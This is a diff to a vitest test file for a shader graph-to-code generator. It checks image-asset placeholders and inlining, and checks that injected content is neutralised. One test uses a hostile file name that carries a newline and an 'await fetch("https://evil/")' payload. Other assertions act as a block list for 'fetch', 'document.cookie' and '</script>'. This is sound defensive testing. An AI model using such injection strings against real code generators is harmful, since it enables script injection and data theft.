@@ -2,6 +2,7 @@ import { describe, it, expect } from 'vitest';
 import { graphToCode } from './graphToCode';
 import { codeToGraph } from './codeToGraph';
 import { buildShaderModule } from './tslCodeProcessor';
+import { inlineImageAssetsFromNodes } from './imageAssets';
 import { makeNode, makeEdge } from '../test-utils';
 
 const B64 = btoa('abc'); // "YWJj"
@@ -23,7 +24,13 @@ describe('graphToCode — imageNode emission', () => {
     const { nodes, edges } = imageGraph(valid);
     const { code } = graphToCode(nodes, edges);
     expect(code).toContain('const _image1_img = new Image();');
-    expect(code).toContain(`_image1_img.src = "data:image/webp;base64,${B64}";`);
+    // The payload rides as a short placeholder + descriptive comment; the real
+    // `data:` URL appears only after inlineImageAssets (see imageAssets.test.ts).
+    expect(code).toMatch(/_image1_img\.src = "fs-asset:img1-[0-9a-f]{8}"; \/\/ x\.webp, 2x2 webp, 3 B/);
+    expect(code).not.toContain(B64);
+    expect(inlineImageAssetsFromNodes(code, nodes)).toContain(
+      `_image1_img.src = "data:image/webp;base64,${B64}";`,
+    );
     expect(code).toContain('try { await _image1_img.decode(); } catch { _image1_ok = false; }');
     expect(code).toContain('new globalThis.THREE.Texture(_image1_img)');
     expect(code).toContain('new globalThis.THREE.DataTexture(new Uint8Array([0, 0, 0, 255])');
@@ -140,11 +147,29 @@ describe('graphToCode — imageNode emission', () => {
     for (const imageB64 of attacks) {
       const { nodes, edges } = imageGraph({ ...valid, imageB64 });
       const { code } = graphToCode(nodes, edges);
-      expect(code).not.toContain('fetch');
-      expect(code).not.toContain('document.cookie');
-      expect(code).not.toContain('</script>');
-      expect(code).toContain('const image1 = vec3(0, 0, 0);');
+      // Neither the editor text nor the expanded, executable form may carry it —
+      // inlining is where the payload actually reaches a running module.
+      for (const emitted of [code, inlineImageAssetsFromNodes(code, nodes)]) {
+        expect(emitted).not.toContain('fetch');
+        expect(emitted).not.toContain('document.cookie');
+        expect(emitted).not.toContain('</script>');
+        expect(emitted).toContain('const image1 = vec3(0, 0, 0);');
+      }
     }
+  });
+
+  it('a hostile file name cannot break out of the placeholder comment', () => {
+    const { nodes, edges } = imageGraph({
+      ...valid,
+      fileName: 'x.webp\nawait fetch("https://evil/");//',
+    });
+    const { code } = graphToCode(nodes, edges);
+    // The comment is built from a character whitelist, so the injected newline
+    // is destroyed and the payload stays inert text inside a one-line comment —
+    // it can never become a statement of its own.
+    const srcLine = code.split('\n').find((l) => l.includes('_image1_img.src')) ?? '';
+    expect(srcLine).toMatch(/^_image1_img\.src = "fs-asset:img1-[0-9a-f]{8}"; \/\/ [A-Za-z0-9._, -]*$/);
+    expect(code).not.toMatch(/^\s*await fetch/m);
   });
 
   it('re-derives the emitted literal from decoded bytes (canonical base64)', () => {
@@ -153,7 +178,9 @@ describe('graphToCode — imageNode emission', () => {
     // form, proving the stored string itself is never spliced into the code.
     const { nodes, edges } = imageGraph({ ...valid, imageB64: 'data:image/png;base64,AB==' });
     const { code } = graphToCode(nodes, edges);
-    expect(code).toContain('_image1_img.src = "data:image/png;base64,AA==";');
+    const inlined = inlineImageAssetsFromNodes(code, nodes);
+    expect(inlined).toContain('_image1_img.src = "data:image/png;base64,AA==";');
+    expect(inlined).not.toContain('AB==');
     expect(code).not.toContain('AB==');
   });
 
@@ -167,7 +194,8 @@ describe('graphToCode — imageNode emission', () => {
   it('setup lines survive buildShaderModule at module scope (top-level await legal)', () => {
     const { nodes, edges } = imageGraph(valid);
     const { code } = graphToCode(nodes, edges);
-    const mod = buildShaderModule(code, {});
+    // Export inlines before building the module, so that's what's exercised here.
+    const mod = buildShaderModule(inlineImageAssetsFromNodes(code, nodes), {});
     // Every setup statement must be re-emitted verbatim, before the exported
     // shader function (module scope — where top-level await is legal).
     for (const line of [
